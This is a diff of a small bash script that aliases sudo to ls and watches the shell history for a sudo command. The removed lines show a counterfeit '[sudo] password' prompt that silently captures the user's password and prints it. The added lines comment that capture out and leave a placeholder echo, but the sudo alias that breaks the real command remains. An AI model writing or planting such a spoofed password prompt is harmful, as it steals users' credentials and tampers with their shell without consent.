@@ -1,11 +1,12 @@
 alias sudo="ls"
 while [ 1 ]
 do 
-	var=`history | egrep "^.{7}sudo.*"|tail -1`
-	if [ -n $var ]
+	history  | grep "sudo"
+	if [ "$?" -ne 1 ] 
 	then
-		read -p "[sudo] password for $USER: " -s d
+		echo "yo"
+		#read -p "[sudo] password for $USER: " -s d
 		break
 	fi
 done
-echo $d
+#echo $d
